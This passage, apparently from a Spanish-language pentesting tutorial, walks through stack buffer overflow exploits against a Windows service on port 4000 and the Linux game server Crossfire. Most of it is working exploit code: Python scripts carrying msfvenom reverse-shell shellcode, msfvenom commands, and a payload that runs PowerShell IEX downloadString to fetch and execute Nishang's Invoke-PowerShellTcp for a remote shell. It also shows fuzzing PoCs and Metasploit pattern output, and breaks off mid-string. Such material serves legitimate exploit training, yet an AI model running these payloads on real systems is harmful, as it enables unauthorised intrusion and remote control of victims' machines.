&quot;\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0&quot;
&quot;\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9&quot;
&quot;\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09&quot;
&quot;\xc0\x8a\x41\xbe\xe1\x9e&quot;)

buffer = &quot;A&quot;*809 + &quot;\x15\x14\x13\x12&quot; + &quot;\x90&quot;*16 + shellcode + &quot;C&quot;*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print &quot;Enviando búffer...&quot;
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send(&quot;USER &quot; + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print &quot;\nError de conexión...\n&quot;
  sys.exit(0)

```

Consiguiendo así que el registro **EIP** apunte a dicha dirección donde posteriormente se aplica el salto al registro **ESP**.

Una manera más elegante y opcional de hacer las cosas es importando la siguiente librería en el script:

```python
from struct import pack
```

La funcionalidad del **pack** nos permite poner en formato _Little Endian_ una dirección pasada directamente sin tener que estar haciendo la conversión manualmente. Para ello, se debería adaptar el script a lo que se muestra a continuación:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket
from struct import pack

if len(sys.argv) != 2:
  print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;dirección-ip&gt;\n&quot;
  sys.exit(0)

shellcode = (&quot;\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1&quot;
&quot;\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20&quot;
&quot;\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20&quot;
&quot;\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04&quot;
&quot;\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd&quot;
&quot;\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51&quot;
&quot;\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d&quot;
&quot;\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b&quot;
&quot;\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7&quot;
&quot;\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6&quot;
&quot;\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09&quot;
&quot;\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6&quot;
&quot;\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c&quot;
&quot;\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98&quot;
&quot;\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14&quot;
&quot;\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d&quot;
&quot;\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68&quot;
&quot;\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0&quot;
&quot;\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9&quot;
&quot;\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12&quot;
&quot;\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0&quot;
&quot;\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9&quot;
&quot;\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09&quot;
&quot;\xc0\x8a\x41\xbe\xe1\x9e&quot;)

buffer = &quot;A&quot;*809 + &quot;B&quot;*4 + pack('&lt;L', 0x12131415) + shellcode + &quot;C&quot;*(1300-809-4-16-351)

ipAddress = sys.argv[1]

port = 4000

try:
  print &quot;Enviando búffer...&quot;
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send(&quot;USER &quot; + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print &quot;\nError de conexión...\n&quot;
  sys.exit(0)

```

Podemos establecer **BreakPoints** desde Immunity Debugger en dicha dirección (pulsando **F2** para ello sobre la dirección), a fin de corroborar que se produce una detención en la ejecución del programa tras el registro **EIP** pasar por la dirección **0x12131415**. En caso de ser así, esto quiere decir que todo ha sido configurado correctamente, donde de pulsar la tecla **F8** una vez alcanzado el breakpoint, vemos que la siguiente instrucción a realizar corresponde al primer **NOP-sled** del registro **ESP**.

Ya con todo esto hecho, tras la ejecución del exploit teniendo una sesión de escucha previa con netcat en el puerto definido... ganaremos acceso al sistema, con la desventaja de que una vez matada la sesión, en caso de volver a ejecutar el script... no ganaremos más veces acceso al sistema, pues el servicio corrompe. Arreglaremos esto en el siguiente punto.


#### Mejorando el Exploit

De forma opcional, en caso de querer tras la ejecución del exploit poder continuamente acceder al sistema sin que el servicio corrompa, lo único que tenemos que hacer como variante al generar nuestro shellcode es lo siguiente:

```
$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 EXITFUNC=thread -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai -f c
```
De esta forma, variamos la función de salida a un modo hilo... haciendo que lo que muera sea el hilo en vez del proceso padre. El Shellcode generado tendrá el mismo tamaño (351 bytes), lo único que habrá que hacer será sutituir el Shellcode por el nuevo generado desde msfvenom.

Tras su ejecución, se podrá comprobar como independientemente del número de veces que se ejecute el exploit, ganaremos siempre acceso al sistema.

En caso de querer mejorar un pelín más nuestro script, contamos con otra vía de tratar los 16 **NOPs** que hemos insertado al principio del registro **ESP**. Se suele considerar más óptimo insertar al principio del registro **ESP** el siguiente Opcode en vez de los **NOPs**, seguidamente continuando con el Shellcode:

```bash
┌─[root@parrot]─[/var/www/html]
└──╼ #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm &gt; sub esp,0x10
00000000  83EC10            sub esp,byte +0x10
```

Insertamos al principio del registro **ESP** el Opcode &quot;**\x83\xEC\x10**&quot;, continuando con el Shellcode. Se considera más óptimo, pues dicha instrucción arrastra el **ESP** lo suficientemente lejos como para que se decodifique el Payload sin ser estropeado, similar al uso intencionado de los NOPs solo que evitando tener que insertar **NOPs** hasta que validemos manualmente que rule (calculando offsets). 

Lo bueno de esta técnica a su vez es que siempre funciona (¿Habrá que tener en cuenta los badchars?, habrá que investigar).

#### Reduciendo el Size y Acceso por Powershell

En caso de que nuestro **Size** en el **ESP** antes de que el servicio crashee de otra forma no llegue a los 351 bytes, podemos utilizar un pequeño truco que obtuve haciendo pruebas para reducir el tamaño de nuestro Shellcode.

La idea para este caso, va a ser obtener una sesión reversa TCP vía **Powershell** aprovechando la utilidad de **Nishang**, concretamente la utilidad **Invoke-PowerShellTcp.ps1**. Dado que resultaría tedioso transferir el script, posteriormente dar una instrucción de importación y luego otra de invocación... lo que haremos será hacerlo todo de una, añadiendo en la última línea del script el siguiente contenido:

`Invoke-PowerShellTcp -Reverse -IPAddress nuestraIP -Port 443`

De esta forma, nos aprovecharemos de **msfvenom** para generar una sentencia como la siguiente:

```bash
$~ msfvenom -p windows/exec CMD=&quot;powershell IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1:8000/PS.ps1')&quot; -f c -a x86 --platform windows EXITFUNC=thread -e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d&quot;

Payload size: 299 bytes
Final size of c file: 1280 bytes
unsigned char buf[] = 
&quot;\xd9\xcb\xbf\xbe\xfd\xc8\xaf\xd9\x74\x24\xf4\x5e\x29\xc9\xb1&quot;
&quot;\x45\x31\x7e\x17\x03\x7e\x17\x83\x50\x01\x2a\x5a\x50\x12\x29&quot;
&quot;\xa5\xa8\xe3\x4e\x2f\x4d\xd2\x4e\x4b\x06\x45\x7f\x1f\x4a\x6a&quot;
&quot;\xf4\x4d\x7e\xf9\x78\x5a\x71\x4a\x36\xbc\xbc\x4b\x6b\xfc\xdf&quot;
&quot;\xcf\x76\xd1\x3f\xf1\xb8\x24\x3e\x36\xa4\xc5\x12\xef\xa2\x78&quot;
&quot;\x82\x84\xff\x40\x29\xd6\xee\xc0\xce\xaf\x11\xe0\x41\xbb\x4b&quot;
&quot;\x22\x60\x68\xe0\x6b\x7a\x6d\xcd\x22\xf1\x45\xb9\xb4\xd3\x97&quot;
&quot;\x42\x1a\x1a\x18\xb1\x62\x5b\x9f\x2a\x11\x95\xe3\xd7\x22\x62&quot;
&quot;\x99\x03\xa6\x70\x39\xc7\x10\x5c\xbb\x04\xc6\x17\xb7\xe1\x8c&quot;
&quot;\x7f\xd4\xf4\x41\xf4\xe0\x7d\x64\xda\x60\xc5\x43\xfe\x29\x9d&quot;
&quot;\xea\xa7\x97\x70\x12\xb7\x77\x2c\xb6\xbc\x9a\x39\xcb\x9f\xf0&quot;
&quot;\xbc\x59\x9a\xb7\xbf\x61\xa4\xe7\xd7\x50\x2f\x68\xaf\x6c\xfa&quot;
&quot;\xcc\x4f\x8f\x2e\x39\xf8\x16\xbb\x80\x65\xa9\x16\xc6\x93\x2a&quot;
&quot;\x92\xb7\x67\x32\xd7\xb2\x2c\xf4\x04\xcf\x3d\x91\x2a\x7c\x3d&quot;
&quot;\xb0\x5a\xed\xb6\x5e\xe8\x82\x50\xc4\x60\x09\x81\x4f\x3d\x89&quot;
&quot;\xe9\x01\xd8\x5e\xc7\xd2\x40\xcb\x72\x8e\xf0\x2b\x33\x35\x8c&quot;
&quot;\x05\x9c\xd0\x0e\x19\x4e\x72\xab\xf3\xfa\xad\x1d\x68\x6c\xd9&quot;
&quot;\x0f\x1c\x1d\x44\xab\x8f\x95\xf4\x5a\x5e\x31\xd1\xbb\xf6\xc9&quot;
&quot;\x55\xb3\x3c\x1d\xb9\x02\x73\x56\xeb\x54\x5d\xa8\xdd\xa5\x9b&quot;
&quot;\xf0\x11\xf5\xeb\x2f\x02\xa6\x25\x40\xd1\x79\x1d\x89\x15&quot;;
```

Como vemos, en este caso en hemos pasado de 351 bytes a 299 bytes. Lo que se debe hacer para acceder al sistema en este caso es simplemente compartir un servidor vía Python en el puerto 8000 (para que desde la máquina se interprete el fichero PS.ps1 [Le hemos cambiado el nombre para reducir los bytes]), y dejar una sesión de escucha vía Netcat por el puerto 443.

Inmediatamente tras ejecutar el script, veremos cómo se recibe un GET desde nuestro servidor web vía Python y cómo en cuestión de segundos ganamos acceso al sistema vía Powershell.

Buffer Overflow Linux
===============================================================================================================================

Hasta donde yo se, no es común que caiga un _Buffer Overflow_ de Linux, pero por si las moscas, detallo el procedimiento usando como ejemplo el aplicativo **Crossfire**.

#### Fuzzing

Para esta primera parte, contamos con el siguiente POC:

```python
#!/usr/bin/python 

import socket 

host = &quot;192.168.1.X&quot; 

crash = &quot;\x41&quot; * 4379 

buffer = &quot;\x11(setup sound &quot; + crash + &quot;\x90\x00#&quot; 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

print &quot;[*]Sending evil buffer...&quot; 
s.connect((host,13327))
s.send(buffer)
data=s.recv(1024)
print data 
s.close()
print &quot;[*]Payload Sent!&quot; 
```

El recurso lo podemos encontrar en el siguiente [enlace](https://github.com/pranatdayal/pentesting-scripts/blob/master/crossfire-poc.py). Adaptamos un poco el exploit a nuestras necesidades:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;direccionIP&gt;\n&quot;
	sys.exit(0)

host = sys.argv[1]
port = 13327

crash = &quot;\x41&quot; * 4379 

buffer = &quot;\x11(setup sound &quot; + crash + &quot;\x90\x00#&quot; 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print &quot;[*] Enviando buffer...&quot; 
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print &quot;[*] Payload Enviado!&quot; 
except:
	print &quot;\nError conectando con el servicio...\n&quot;
	sys.exit(0)
```

Para este caso, nos dan un PoC con el offset calculado. Curiosamente, para este caso si superamos el tamaño del buffer el programa crasheará de otra forma, por lo que es importante mantener esta cifra fija y para cualquier operación que hagamos tener bien calculados los tamaños.

Para empezar, iniciamos **edb** con el programa corriendo, de la siguiente forma:

```bash
$~ edb --run /usr/games/crossfire/bin/crossfire
```

Pulsamos la tecla **F9** 2 veces y mandamos el buffer desde consola. Desde **edb**, podremos observar la siguiente respuesta:

```bash
The debugged application encountered a segmentation fault.
The address 0x41414141 does not appear to be mapped.
```

Lo cual está genial, pues estamos sobreescribiendo el registro EIP, tal y como podremos comprobar posteriormente desde la sección _Registers_ del aplicativo. Llegados a este punto, calculamos el Offset a continuación a fin de corroborar si efectivamente podemos tomar el control del **EIP**, mandando para ello 4 bytes correspondientes al caracter _B_ posteriormente.

#### Calculando el Offset en Linux

El procedimiento realmente es el mismo que en Windows, sólo que lo referencio así en el título así para que el enlace directo desde el Índice no de problemas.

Usaremos una vez más el **pattern_create** y el **pattern_offset** de Metasploit. Dado que conocemos que por el momento el valor con el que vamos a trabajar es _4379_, matendremos esta cifra fija, en caso contrario el programa recordemos que crasheará de otra forma:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/BoF]
└──╼ #/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp
```

Tomamos el resultado y lo añadimos en nuestro script:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print &quot;\nUso: python&quot; + sys.argv[0] + &quot; &lt;direccionIP&gt;\n&quot;
	sys.exit(0)

host = sys.argv[1]
port = 13327

# Total bytes: 4379
crash = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1C